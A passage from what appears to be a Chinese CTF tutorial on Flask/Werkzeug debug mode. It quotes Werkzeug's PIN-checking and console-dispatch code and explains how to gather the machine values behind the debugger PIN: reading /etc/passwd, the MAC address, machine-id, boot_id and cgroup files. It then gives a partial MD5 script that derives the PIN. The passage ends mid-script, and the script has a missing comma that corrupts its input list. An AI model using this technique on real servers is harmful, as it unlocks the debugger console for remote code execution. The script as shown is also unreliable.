                ns <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>console_init_func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            ns<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">"app"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>app<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> _ConsoleFrame<span class="token punctuation">(</span>ns<span class="token punctuation">)</span>
        is_trusted <span class="token operator">=</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>request<span class="token punctuation">.</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>
            render_console_html<span class="token punctuation">(</span>secret<span class="token operator">=</span>self<span class="token punctuation">.</span>secret<span class="token punctuation">,</span> evalex_trusted<span class="token operator">=</span>is_trusted<span class="token punctuation">)</span><span class="token punctuation">,</span>
            mimetype<span class="token operator">=</span><span class="token string">"text/html"</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get_resource</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">:</span> Request<span class="token punctuation">,</span> filename<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Return a static resource from the shared folder."""</span>
        path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">"shared"</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> pkgutil<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span>__package__<span class="token punctuation">,</span> path<span class="token punctuation">)</span>
        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
            <span class="token keyword">return</span> NotFound<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore[return-value]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> NotFound<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore[return-value]</span>

            etag <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>adler32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>
                BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>environ<span class="token punctuation">,</span> download_name<span class="token operator">=</span>filename<span class="token punctuation">,</span> etag<span class="token operator">=</span>etag
            <span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">check_pin_trust</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Checks if the request passed the pin test.  This returns `True` if the
        request is trusted on a pin/cookie basis and returns `False` if not.
        Additionally if the cookie's stored pin hash is wrong it will return
        `None` so that appropriate action can be taken.
        """</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>pin <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        val <span class="token operator">=</span> parse_cookie<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> val <span class="token keyword">or</span> <span class="token string">"|"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> val<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        ts_str<span class="token punctuation">,</span> pin_hash <span class="token operator">=</span> val<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            ts <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ts_str<span class="token punctuation">)</span>
        <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

        <span class="token keyword">if</span> pin_hash <span class="token operator">!=</span> hash_pin<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> PIN_TIME<span class="token punctuation">)</span> <span class="token operator">&lt;</span> ts

    <span class="token keyword">def</span> <span class="token function">_fail_pin_auth</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5.0</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">></span> <span class="token number">5</span> <span class="token keyword">else</span> <span class="token number">0.5</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">+=</span> <span class="token number">1</span>

    <span class="token keyword">def</span> <span class="token function">pin_auth</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">:</span> Request<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Authenticates with the pin."""</span>
        exhausted <span class="token operator">=</span> <span class="token boolean">False</span>
        auth <span class="token operator">=</span> <span class="token boolean">False</span>
        trust <span class="token operator">=</span> self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>request<span class="token punctuation">.</span>environ<span class="token punctuation">)</span>
        pin <span class="token operator">=</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span>

        <span class="token comment"># If the trust return value is `None` it means that the cookie is</span>
        <span class="token comment"># set but the stored pin hash value is bad.  This means that the</span>
        <span class="token comment"># pin was changed.  In this case we count a bad auth and unset the</span>
        <span class="token comment"># cookie.  This way it becomes harder to guess the cookie name</span>
        <span class="token comment"># instead of the pin as we still count up failures.</span>
        bad_cookie <span class="token operator">=</span> <span class="token boolean">False</span>
        <span class="token keyword">if</span> trust <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>_fail_pin_auth<span class="token punctuation">(</span><span class="token punctuation">)</span>
            bad_cookie <span class="token operator">=</span> <span class="token boolean">True</span>

        <span class="token comment"># If we're trusted, we're authenticated.</span>
        <span class="token keyword">elif</span> trust<span class="token punctuation">:</span>
            auth <span class="token operator">=</span> <span class="token boolean">True</span>

        <span class="token comment"># If we failed too many times, then we're locked out.</span>
        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
            exhausted <span class="token operator">=</span> <span class="token boolean">True</span>

        <span class="token comment"># Otherwise go through pin based authentication</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            entered_pin <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">"pin"</span><span class="token punctuation">]</span>

            <span class="token keyword">if</span> entered_pin<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">==</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">=</span> <span class="token number">0</span>
                auth <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>_fail_pin_auth<span class="token punctuation">(</span><span class="token punctuation">)</span>

        rv <span class="token operator">=</span> Response<span class="token punctuation">(</span>
            json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"auth"</span><span class="token punctuation">:</span> auth<span class="token punctuation">,</span> <span class="token string">"exhausted"</span><span class="token punctuation">:</span> exhausted<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            mimetype<span class="token operator">=</span><span class="token string">"application/json"</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
        <span class="token keyword">if</span> auth<span class="token punctuation">:</span>
            rv<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span>
                self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hash_pin<span class="token punctuation">(</span>pin<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>
                httponly<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                samesite<span class="token operator">=</span><span class="token string">"Strict"</span><span class="token punctuation">,</span>
                secure<span class="token operator">=</span>request<span class="token punctuation">.</span>is_secure<span class="token punctuation">,</span>
            <span class="token punctuation">)</span>
        <span class="token keyword">elif</span> bad_cookie<span class="token punctuation">:</span>
            rv<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">)</span>
        <span class="token keyword">return</span> rv

    <span class="token keyword">def</span> <span class="token function">log_pin_request</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Log the pin if needed."""</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>pin_logging <span class="token keyword">and</span> self<span class="token punctuation">.</span>pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            _log<span class="token punctuation">(</span>
                <span class="token string">"info"</span><span class="token punctuation">,</span> <span class="token string">" * To enable the debugger you need to enter the security pin:"</span>
            <span class="token punctuation">)</span>
            _log<span class="token punctuation">(</span><span class="token string">"info"</span><span class="token punctuation">,</span> <span class="token string">" * Debugger pin code: %s"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span>
        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>
        self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">,</span> start_response<span class="token punctuation">:</span> <span class="token string">"StartResponse"</span>
    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Iterable<span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Dispatch the requests."""</span>
        <span class="token comment"># important: don't ever access a function here that reads the incoming</span>
        <span class="token comment"># form data!  Otherwise the application won't have access to that data</span>
        <span class="token comment"># any more!</span>
        request <span class="token operator">=</span> Request<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
        response <span class="token operator">=</span> self<span class="token punctuation">.</span>debug_application
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"__debugger__"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>
            cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span>
            arg <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span>
            secret <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">)</span>
            frame <span class="token operator">=</span> self<span class="token punctuation">.</span>frames<span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"frm"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>
            <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">"resource"</span> <span class="token keyword">and</span> arg<span class="token punctuation">:</span>
                response <span class="token operator">=</span> self<span class="token punctuation">.</span>get_resource<span class="token punctuation">(</span>request<span class="token punctuation">,</span> arg<span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>
            <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">"pinauth"</span> <span class="token keyword">and</span> secret <span class="token operator">==</span> self<span class="token punctuation">.</span>secret<span class="token punctuation">:</span>
                response <span class="token operator">=</span> self<span class="token punctuation">.</span>pin_auth<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>
            <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">"printpin"</span> <span class="token keyword">and</span> secret <span class="token operator">==</span> self<span class="token punctuation">.</span>secret<span class="token punctuation">:</span>
                response <span class="token operator">=</span> self<span class="token punctuation">.</span>log_pin_request<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>
            <span class="token keyword">elif</span> <span class="token punctuation">(</span>
                self<span class="token punctuation">.</span>evalex
                <span class="token keyword">and</span> cmd <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span>
                <span class="token keyword">and</span> frame <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span>
                <span class="token keyword">and</span> self<span class="token punctuation">.</span>secret <span class="token operator">==</span> secret
                <span class="token keyword">and</span> self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">:</span>
                response <span class="token operator">=</span> self<span class="token punctuation">.</span>execute_command<span class="token punctuation">(</span>request<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> frame<span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>
        <span class="token keyword">elif</span> <span class="token punctuation">(</span>
            self<span class="token punctuation">.</span>evalex
            <span class="token keyword">and</span> self<span class="token punctuation">.</span>console_path <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span>
            <span class="token keyword">and</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> self<span class="token punctuation">.</span>console_path
        <span class="token punctuation">)</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> self<span class="token punctuation">.</span>display_console<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>
        <span class="token keyword">return</span> response<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>生成要素：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">1.flask所登录的用户名
username
通过getpass.getuser()读取，通过文件读取/etc/passwd
linux可以查看/etc/passwd
windows可以查看C:/Users目录

2.modname
modname
通过getattr(mod,“file”,None)读取，默认值为flask.app

3.getattr(app, “name”, app.class.name)
appname
通过getattr(app,“name”,type(app).name)读取，默认值为Flask

4.flask库下app.py的绝对路径
moddir
当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取
通常报错信息会提示
File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 2463, in __call__
得到：/usr/local/lib/python3.7/site-packages/flask/app.py

5.当前网络的mac地址的十进制数
uuidnode
通过uuid.getnode()读取，通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算

6.docker机器id
machine_id
每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个，非docker要读三个不加任何字符的直接拼接)：
1./etc/machine-id 
2./proc/sys/kernel/random/boot_id 
3./proc/self/cgroup  (docker/后面的字符串)

#有时单独/proc/self/cgroup
#有时/proc/sys/kernel/random/boot_id+/proc/self/cgroup
#有时/etc/machine-id+/proc/self/cgroup

如果存在/etc/machine-id：/etc/machine-id+/proc/self/cgroup
如果不存在/etc/machine-id，存在/proc/sys/kernel/random/boot_id：/proc/sys/kernel/random/boot_id+/proc/self/cgroup
如果两个都不存在 /proc/self/cgroup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里最容易出错的是machine_id</p>
<p>根据源码（#有个break）可以看出来</p>
<p>python3.8的machine-id是从</p>
<p>&#x2F;etc&#x2F;machine-id </p>
<p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </p>
<p>&#x2F;proc&#x2F;self&#x2F;cgroup</p>
<p>规则是（python3.8不同版本可能规则不一样 算法路径：<code>/usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py</code>）</p>
<p>如果存在&#x2F;etc&#x2F;machine-id：&#x2F;etc&#x2F;machine-id+&#x2F;proc&#x2F;self&#x2F;cgroup</p>
<p>如果不存在&#x2F;etc&#x2F;machine-id，存在&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id：&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id+&#x2F;proc&#x2F;self&#x2F;cgroup</p>
<p>如果两个都不存在 &#x2F;proc&#x2F;self&#x2F;cgroup</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">if</span> value<span class="token punctuation">:</span>
                linux <span class="token operator">+=</span> value
                <span class="token keyword">break</span> <span class="token comment">#有个break</span>

        <span class="token comment"># Containers share the same machine id, add some cgroup</span>
        <span class="token comment"># information. This is used outside containers too but should be</span>
        <span class="token comment"># relatively stable across boots.</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>
            <span class="token keyword">return</span> linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>当这6个值我们可以获取到时，就可以推算出生成的PIN码</p>
<h2 id="生成算法"><a href="#生成算法" class="headerlink" title="生成算法"></a>生成算法</h2><p> 3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同 </p>
<p>3.6</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#MD5</span>
<span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
     <span class="token string">'flaskweb'</span>
     <span class="token string">'flask.app'</span><span class="token punctuation">,</span>
     <span class="token string">'Flask'</span><span class="token punctuation">,</span>
     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span>
<span class="token punctuation">]</span>
private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span>
     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span>
<span class="token punctuation">]</span>
h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>
cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
rv <span class="token operator">=</span><span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
